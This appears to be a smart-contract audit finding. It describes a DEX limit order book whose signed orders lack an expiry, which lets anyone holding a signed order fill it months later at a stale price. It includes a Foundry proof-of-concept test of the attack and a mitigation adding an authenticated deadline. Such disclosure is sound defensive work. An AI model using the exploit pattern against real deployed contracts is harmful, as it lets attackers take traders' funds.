# DEX Limit Order Book — Missing Order Deadline / Stale Order Execution

## Vulnerability Summary

The `LimitOrderBook` contract allows a maker to sign a limit order that remains executable indefinitely because the order contains no expiration timestamp and the signature does not commit to a deadline.

The order hash is constructed from:

```solidity
bytes32 orderHash = keccak256(
    abi.encode(
        order.maker,
        order.tokenIn,
        order.tokenOut,
        order.amountIn,
        order.minAmountOut
    )
);
```

No `deadline`, `expiry`, or other time-bound parameter is included.

As a result, once Alice signs an order, any third party can execute that order at any later time, provided that:

* the order has not already been filled;
* the order has not been cancelled;
* the caller satisfies the minimum output requirement.

This violates the intended invariant:

> **Signed limit orders should only be executable within a time window chosen by the maker.**

The practical consequence is that a signed order can remain valid forever.

For example, Alice may intend to sell 10 WETH for at least 20,000 USDC during a one-hour window. If a keeper or MEV bot observes the signed order and holds it, the order can later be executed after the market moves significantly against Alice.

If WETH later trades at 4,000 USDC, the stale order can still be executed for only 20,000 USDC, even though the 10 WETH are then worth approximately 40,000 USDC.

---

## Vulnerable Code

The order structure contains no expiration field:

```solidity
struct Order {
    address maker;
    address tokenIn;
    address tokenOut;
    uint256 amountIn;
    uint256 minAmountOut;
}
```

The order hash also contains no deadline:

```solidity
bytes32 orderHash = keccak256(
    abi.encode(
        order.maker,
        order.tokenIn,
        order.tokenOut,
        order.amountIn,
        order.minAmountOut
    )
);
```

The signature therefore authenticates only the economic parameters of the order:

```text
maker
tokenIn
tokenOut
amountIn
minAmountOut
```

Signature validation is otherwise correct:

```solidity
bytes32 ethHash =
    MessageHashUtils.toEthSignedMessageHash(orderHash);

require(
    ethHash.recover(signature) == order.maker,
    "Bad sig"
);
```

However, `fillOrder()` contains no expiration check:

```solidity
require(
    block.timestamp <= order.deadline,
    "Order expired"
);
```

because the order has no `deadline` field at all.

The only state-based protection is:

```solidity
require(
    !filledOrders[orderHash],
    "Already filled"
);
```

which prevents a filled order from being executed again but does not impose any time limit.

---

## Root Cause

The root cause is the absence of an authenticated expiration condition.

A maker intends to authorize something equivalent to:

```text
Sell 10 WETH for at least 20,000 USDC
during a specific time window
```

but the signed message actually authorizes only:

```text
Sell 10 WETH for at least 20,000 USDC
```

There is no cryptographically authenticated statement such as:

```text
valid until = 1 hour from signing
```

Therefore the signature remains valid indefinitely.

The contract cannot distinguish between:

```text
"execute this order within the next hour"
```

and:

```text
"execute this order at any time in the future"
```

because both produce the exact same signed message.

---

## Invariant

The intended security property is:

> **A signed limit order should only be executable within the time window selected by the maker.**

Once that time window expires, the order should become invalid automatically without requiring the maker to submit a cancellation transaction.

---

## What Breaks

Without a deadline in the signed message, a signed order is valid forever until it is filled or cancelled.

This creates a temporal replay problem.

A keeper, searcher, or MEV bot can observe a maker's signed order and choose not to execute it immediately.

For example, the signed order specifies:

```text
Sell:
10 WETH

Minimum output:
20,000 USDC

Effective minimum price:
2,000 USDC / WETH
```

The bot can hold the signed order and wait for market conditions to change.

If WETH later rises to:

```text
4,000 USDC / WETH
```

the stale order is still executable at:

```text
2,000 USDC / WETH
```

because the contract checks only:

```solidity
amountOut >= order.minAmountOut
```

and does not check whether the order has expired.

The 10 WETH are now worth approximately:

```text
10 × 4,000 = 40,000 USDC
```

but the attacker can purchase them for:

```text
20,000 USDC
```

creating a 20,000 USDC difference between the current market value and the stale order's minimum price.

---

## Attack Scenario

### Step 1 — Alice signs an order

On Monday, Alice signs:

```text
Sell 10 WETH
Minimum receive: 20,000 USDC
```

The minimum price is:

```text
20,000 / 10 = 2,000 USDC per WETH
```

Alice intends this to be a one-hour limit order.

Conceptually:

```text
Monday 10:00
    │
    │ valid
    │
Monday 11:00
    │
    └── intended expiry
```

However, no deadline is included in the signed message.

### Step 2 — Alice's intended one-hour window expires

After one hour, Alice considers the order expired.

A secure implementation should reject execution after this point.

The vulnerable contract does not.

The exact same signature remains valid.

### Step 3 — Keeper or MEV bot captures the signed order

A keeper, searcher, or MEV bot obtains the signed order and does not immediately execute it.

The important point is that the authorization can be retained and used later because the signature has no expiration.

The order can therefore remain available for future execution.

### Step 4 — Three months later, WETH trades at 4,000 USDC

Suppose three months later:

```text
WETH = 4,000 USDC
```

Alice's original order still specifies:

```text
Minimum output = 20,000 USDC
```

The market value of her 10 WETH is now approximately:

```text
10 × 4,000 = 40,000 USDC
```

### Step 5 — Bot executes the stale order

The bot calls:

```solidity
book.fillOrder(
    order,
    20_000e6,
    signature
);
```

The contract checks:

```solidity
ethHash.recover(signature) == order.maker
```

which succeeds.

It then checks:

```solidity
amountOut >= order.minAmountOut
```

which also succeeds because:

```text
20,000 >= 20,000
```

There is still no check against `block.timestamp`.

### Step 6 — Alice's WETH are transferred

The contract executes:

```solidity
IERC20(order.tokenIn).safeTransferFrom(
    order.maker,
    msg.sender,
    order.amountIn
);
```

The attacker receives:

```text
10 WETH
```

and transfers:

```text
20,000 USDC
```

to Alice.

### Step 7 — Economic result

At the time of execution:

```text
Market value of 10 WETH ≈ 40,000 USDC

Amount Alice receives = 20,000 USDC
```

The difference is approximately:

```text
40,000 - 20,000 = 20,000 USDC
```

This represents the economic disadvantage caused by executing the stale order at the old minimum price.

Alice's order has therefore functioned as a standing authorization for an unlimited period, despite her original intent being a one-hour order.

---

## Exploit Path

The complete exploit path is:

```text
1. Alice signs:
   sell 10 WETH for minimum 20,000 USDC

2. Alice intends:
   order lifetime = 1 hour

3. Deadline is not encoded in the signature

4. Keeper / MEV bot obtains the signed order

5. Bot does not execute immediately

6. Three months pass

7. WETH rises to 4,000 USDC

8. Bot calls fillOrder(..., 20,000 USDC, signature)

9. Signature verification succeeds

10. Slippage check succeeds:
    20,000 >= 20,000

11. No expiry check exists

12. Alice's 10 WETH are transferred

13. Bot receives assets worth approximately 40,000 USDC

14. Bot pays only 20,000 USDC
```

---

## Proof-of-Concept

The following Foundry test demonstrates that an order intended to expire after one hour can still be executed three months later.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

import "../src/DexOrderBookDeadline.sol";
import "./mocks/MockERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract LimitOrderBookDeadlineDexTest is Test {
    LimitOrderBook public book;

    MockERC20 public WETH;
    MockERC20 public USDC;

    uint256 alicePrivateKey;
    address alice;

    address attacker;

    uint256 constant ETH_AMOUNT = 10 ether;

    // Alice accepts at least 20,000 USDC.
    uint256 constant MIN_USDC = 20_000e6;

    // Alice intends the order to remain active for only 1 hour.
    uint256 constant ORDER_DURATION = 1 hours;

    function setUp() public {
        alicePrivateKey = 0xA11CE;
        alice = vm.addr(alicePrivateKey);

        attacker = makeAddr("attacker");

        book = new LimitOrderBook();

        WETH = new MockERC20("Wrapped Ether", "WETH");
        USDC = new MockERC20("USD Coin", "USDC");

        WETH.mint(alice, ETH_AMOUNT);
        USDC.mint(attacker, MIN_USDC);

        vm.prank(alice);
        WETH.approve(
            address(book),
            type(uint256).max
        );

        vm.prank(attacker);
        USDC.approve(
            address(book),
            type(uint256).max
        );
    }

    function test_staleOrderCanBeExecutedMonthsLater() public {
        /*
         * ------------------------------------------------------------
         * DAY 0
         * ------------------------------------------------------------
         *
         * Alice signs:
         *
         * 10 WETH -> minimum 20,000 USDC
         *
         * Alice intends a lifetime of one hour.
         *
         * The vulnerable order contains NO deadline.
         */

        LimitOrderBook.Order memory order =
            LimitOrderBook.Order({
                maker: alice,
                tokenIn: address(WETH),
                tokenOut: address(USDC),
                amountIn: ETH_AMOUNT,
                minAmountOut: MIN_USDC
            });

        uint256 createdAt = block.timestamp;

        uint256 intendedDeadline =
            createdAt + ORDER_DURATION;

        /*
         * Exactly reproduce the hash used by fillOrder().
         *
         * Notice that there is no deadline.
         */
        bytes32 orderHash = keccak256(
            abi.encode(
                order.maker,
                order.tokenIn,
                order.tokenOut,
                order.amountIn,
                order.minAmountOut
            )
        );

        bytes32 ethHash =
            MessageHashUtils.toEthSignedMessageHash(
                orderHash
            );

        /*
         * Alice signs the order.
         */
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(
                alicePrivateKey,
                ethHash
            );

        bytes memory signature =
            abi.encodePacked(
                r,
                s,
                v
            );

        /*
         * Confirm that the signature belongs to Alice.
         */
        assertEq(
            ECDSA.recover(
                ethHash,
                signature
            ),
            alice
        );

        /*
         * ------------------------------------------------------------
         * ONE HOUR PASSES
         * ------------------------------------------------------------
         */

        vm.warp(
            intendedDeadline + 1
        );

        assertGt(
            block.timestamp,
            intendedDeadline
        );

        /*
         * Alice's intended order window has expired.
         *
         * The vulnerable contract has no timestamp check.
         */

        /*
         * ------------------------------------------------------------
         * THREE MONTHS LATER
         * ------------------------------------------------------------
         */

        vm.warp(
            createdAt + 90 days
        );

        assertGt(
            block.timestamp,
            intendedDeadline
        );

        /*
         * ------------------------------------------------------------
         * ATTACK
         * ------------------------------------------------------------
         *
         * The attacker executes the stale signed order.
         *
         * They pay exactly Alice's minimum:
         *
         * 20,000 USDC
         *
         * and receive:
         *
         * 10 WETH
         */

        vm.prank(attacker);

        book.fillOrder(
            order,
            MIN_USDC,
            signature
        );

        /*
         * ------------------------------------------------------------
         * IMPACT
         * ------------------------------------------------------------
         */

        // Alice sold all 10 WETH.
        assertEq(
            WETH.balanceOf(alice),
            0
        );

        // Alice received only the original minimum.
        assertEq(
            USDC.balanceOf(alice),
            MIN_USDC
        );

        // Attacker received Alice's 10 WETH.
        assertEq(
            WETH.balanceOf(attacker),
            ETH_AMOUNT
        );

        // Attacker spent all 20,000 USDC.
        assertEq(
            USDC.balanceOf(attacker),
            0
        );

        // The order is now marked as filled.
        assertTrue(
            book.isOrderFilled(orderHash)
        );
    }
}
```

Run:

```bash
forge test \
    --match-test test_staleOrderCanBeExecutedMonthsLater \
    -vv
```

Expected:

<img width="815" height="165" alt="image" src="https://github.com/user-attachments/assets/06d37607-cb0c-4475-a30a-72a240fbb6b3" />


The most important part of the PoC is:

```solidity
vm.warp(createdAt + 90 days);

vm.prank(attacker);

book.fillOrder(
    order,
    MIN_USDC,
    signature
);
```

The test intentionally moves the blockchain timestamp far beyond Alice's intended one-hour window and demonstrates that the exact same signed order is still accepted.

---

## Impact

The primary impact is **stale-order execution**.

The maker's signed authorization survives indefinitely instead of expiring at the end of the intended trading window.

This can expose makers to significant economic losses when market prices move after the order was signed.

Example:

```text
Signed order:
10 WETH
minimum = 20,000 USDC

Later market price:
4,000 USDC / WETH

Current value:
10 × 4,000 = 40,000 USDC

Stale execution price:
20,000 USDC
```

Potential economic disadvantage:

```text
40,000 - 20,000 = 20,000 USDC
```

This is an opportunity-cost / adverse-execution scenario rather than a guaranteed fixed loss; the actual loss depends on the market price when the stale order is executed.

The attacker does not need to compromise Alice's private key. They only need access to the signed order and enough USDC to satisfy its minimum output.

---

## Recommended Mitigation

Add a `deadline` to the order structure:

```solidity
struct Order {
    address maker;
    address tokenIn;
    address tokenOut;
    uint256 amountIn;
    uint256 minAmountOut;
    uint256 deadline;
}
```

Include the deadline in the signed message:

```solidity
bytes32 orderHash = keccak256(
    abi.encode(
        order.maker,
        order.tokenIn,
        order.tokenOut,
        order.amountIn,
        order.minAmountOut,
        order.deadline
    )
);
```

Then enforce the deadline during execution:

```solidity
require(
    block.timestamp <= order.deadline,
    "Order expired"
);
```

A corrected execution flow would therefore be:

```solidity
function fillOrder(
    Order calldata order,
    uint256 amountOut,
    bytes memory signature
) external {
    require(
        block.timestamp <= order.deadline,
        "Order expired"
    );

    bytes32 orderHash = keccak256(
        abi.encode(
            order.maker,
            order.tokenIn,
            order.tokenOut,
            order.amountIn,
            order.minAmountOut,
            order.deadline
        )
    );

    require(
        !filledOrders[orderHash],
        "Already filled"
    );

    bytes32 ethHash =
        MessageHashUtils.toEthSignedMessageHash(
            orderHash
        );

    require(
        ethHash.recover(signature) == order.maker,
        "Bad sig"
    );

    require(
        amountOut >= order.minAmountOut,
        "Slippage"
    );

    filledOrders[orderHash] = true;

    IERC20(order.tokenIn).safeTransferFrom(
        order.maker,
        msg.sender,
        order.amountIn
    );

    IERC20(order.tokenOut).safeTransferFrom(
        msg.sender,
        order.maker,
        amountOut
    );
}
```

For a production implementation, EIP-712 typed structured data is preferable so the signature explicitly commits to the complete order domain and parameters.

A signed order should generally bind at least:

```text
maker
tokenIn
tokenOut
amountIn
minAmountOut
deadline
```

and, depending on the design, a nonce or unique order identifier.

---

## Security Considerations

### Deadline must be part of the signed message

Simply adding a `deadline` parameter to `fillOrder()` is not sufficient.

This would be unsafe:

```solidity
fillOrder(order, amountOut, deadline, signature)
```

if the deadline is not included in the data Alice signed.

Otherwise, the caller could supply an arbitrary deadline at execution time.

The deadline must therefore be cryptographically authenticated.

### `filledOrders` does not provide expiration

The mapping:

```solidity
mapping(bytes32 => bool) public filledOrders;
```

only provides one-time execution.

It does not establish a temporal validity window.

An unfilled order remains executable indefinitely.

### Cancellation does not replace expiration

`cancelOrder()` provides a manual mechanism for invalidating an order:

```solidity
require(
    msg.sender == order.maker,
    "Not maker"
);
```

However, this requires the maker to remember the order and submit a cancellation transaction.

A deadline provides automatic expiration even when the maker takes no action.

### Temporal dimensions should be considered during review

A signature can be cryptographically valid while still being semantically stale.

Auditors may verify that:

* the signature is correctly recovered;
* the maker is correctly identified;
* the order can only be filled once;
* slippage requirements are respected;
* cancellation works.

Those checks can all be correct while the protocol still lacks an expiration mechanism.

This vulnerability is therefore easy to miss because the order structure appears to contain all major economic parameters:

```text
maker
tokenIn
tokenOut
amountIn
minAmountOut
```

The missing field is not an obvious arithmetic or authorization error; it is a missing **temporal constraint**.

---

## Why This Was Missed

The implementation correctly verifies the maker's signature and correctly enforces one-time fill-or-cancel semantics.

The problem is that the review can stop at:

```text
"Can an attacker forge the maker's signature?"
```

and:

```text
"Can the order be filled twice?"
```

Both answers are effectively protected.

The deeper question is:

> **For how long is the maker's signature supposed to remain valid?**

The order struct looks complete because it contains the economic parameters required to perform a trade. However, a limit order also has a temporal dimension.

Without that dimension being explicitly authenticated, the protocol unintentionally transforms:

```text
1-hour limit order
```

into:

```text
indefinite limit order
```

That is the core security failure. 
